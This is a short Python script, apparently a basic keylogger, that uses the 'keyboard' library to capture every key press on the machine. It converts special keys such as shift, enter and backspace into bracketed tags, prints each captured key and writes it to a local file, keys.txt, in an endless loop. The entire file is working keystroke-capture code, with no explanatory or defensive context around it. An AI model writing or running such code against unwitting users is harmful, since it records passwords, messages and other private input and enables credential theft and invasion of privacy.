import keyboard

# create a file to record the keystrokes being captured
f = open("keys.txt", "w")

# constantly loop through all the characters and check if they are currently being pressed or not
while True:
    rk = keyboard.read_event()
    key = rk.name
    if rk.event_type == "down":
        if key == "space":
            key = " "
        elif key == "backspace":
            key = "[backspace]"
        elif key == "enter":
            key = "[enter]"
        elif key == "shift" or key == "right shift":
            key = "[shift]"
        elif key == "ctrl" or key == "right ctrl":
            key = "[ctrl]" 
        elif key == "caps lock":
            key = "[caps]"
        elif key == "tab":
            key = "[tab]"
        elif key == "right alt" or key == "alt":
            key = "[alt]"
        print("Logged: ", key)
        f.write(key)
    

